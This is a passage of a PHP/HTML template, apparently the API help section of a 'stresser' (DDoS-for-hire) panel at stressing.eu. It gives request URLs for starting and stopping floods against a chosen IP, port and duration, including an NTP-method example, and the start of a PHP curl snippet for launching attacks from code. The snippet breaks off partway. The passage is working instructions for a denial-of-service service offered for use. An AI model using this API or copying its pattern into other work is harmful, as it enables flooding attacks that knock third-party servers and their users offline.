	  ...
	  <div class="widget-content">
          ...
          <div class="white-box">
		  	...
		  	<form method="POST">
	            ...
	            <input class="form-control" type="text" value="https://stressing.eu/api/api.php?key=<?php echo $key;?>&host=[host]&port=[port]&time=[time]&method=[method]&vip=[1]" readonly="" style="color:black;">
	            <?php }else{?>
				<input class="form-control" type="text" value="https://stressing.eu/api/api.php?key=<?php echo $key;?>&host=[ip]&port=[port]&time=[Seconds]&method=[Method/stop]&vip=0" readonly="" style="color:black;">
				<?php }?>
				<?php }else{?>
	...
	<div class="card">
		...
		<div id="faq2_q1" class="collapse" role="tabpanel" aria-labelledby="faq2_h1">
			...
			<?php if($user->api($odb)){?>
				...
				<code style="color:black;">
				Examples:<br>
				https://stressing.eu/api/api.php?key=[KEY]&host=[IPv4]&port=[PORT]&time=[SECONDS]&method=[METHOD/STOP]&totalservers=[SERVERS]&vip=[1 or 0]<br>
				https://stressing.eu/api/api.php?key=[KEY]&host=0.0.0.0&port=80&time=30&method=NTP&totalservers=1&vip=0<br>
				</code>
				</p>
				<p>Stop</p>
				<p>
				<code style="color:black;">
				Examples:<br>
				https://stressing.eu/api/api.php?key=[KEY]&host=[IPv4]&port=[PORT]&time=[SECONDS]&method=stop<br>
				https://stressing.eu/api/api.php?key=[KEY]&host=0.0.0.0&port=80&time=30&method=stop&totalservers=1&vip=0<br>
				</code>
				
				<p>Example Using php Curl</p>
				<code style="color:black;">
				<br>
				  			    $apiurl = 'https://stressing.eu/api/apiaexample.php?key=xxxxxxxxxxxxxx&host='. $host .'&port='. $port .'&time='. $time .'&method='. $method .'&totalservers='. $totalservers .'&vip=0';<br>
			<br>
                                            $ch = curl_init();<br>
